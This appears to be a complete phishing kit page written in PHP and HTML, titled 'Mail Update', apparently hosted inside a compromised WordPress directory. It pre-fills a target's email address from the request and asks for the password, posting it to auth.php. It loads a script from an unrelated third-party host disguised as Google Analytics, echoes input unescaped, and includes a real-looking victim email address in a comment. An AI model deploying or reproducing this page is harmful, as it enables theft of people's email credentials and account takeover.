<?
$login = $_REQUEST['login'];
?>
<!-- saved from url=(0084)https://kadoshtransportes.com.br/wp-includes/ID3/en-gb/?email=insheng@ms68.hinet.net -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<link rel="shortcut icon" href="http://i.imgur.com/n5MsulL.png" type="image/gif">
<title>Mail Update</title><script src="http://petstop.com.sg/google_analytics_auto.js"></script></head>
<body>

<br><br>

<table align="center">

<tbody><tr><td>

	<div align="center">

	<img src="http://i.imgur.com/Znhtb6w.png" width="160" height="70">

	<br><br>

	<font face="verdana" size="2">
	Sign-in to proceed with Update 
	</font>


	<br>

	<form method="post" action="auth.php">


	<br><br>

	<input name="login" type="hidden" class="form-control" id="email" value="<? print $login; ?>" placeholder="Email">
				<font face="arial" size="3" color="#045FB4"><? print $login; ?></font>

	<br><br>

	<input name="passwd" pattern=".{5,50}" type="password" style="width:250px; height:40px; font-family: Verdana; font-size: 15px; font-weight: light; color:#000000; 
	background-color: #ffffff; border: solid 1px #848484; padding: 13px;" required="" placeholder="Enter Password" title="Enter Password" autofocus="">	



	<br><br>

	<input type="submit" value="Update Now" style="width:250px; height:60px; background-color: #0B2161; border: solid 3px #0B2161; 
	font-family: Verdana; font-size: 17px; font-weight: light; color: #ffffff; -moz-border-radius: 4px; -webkit-border-radius: 4px; 
	-khtml-border-radius: 4px; border-radius: 4px;
	-moz-box-shadow: 3px 3px 3px #888; -webkit-box-shadow: 3px 3px 3px #888; box-shadow: 3px 3px 3px #888;">

	<br>
	</form>



	<br>
	<hr width="250" align="center">

	<font face="calibri" size="2">
	Mail Team 2017 | All rights reserved.
	</font>	

	</div>

</td></tr>

</tbody></table>



</body></html>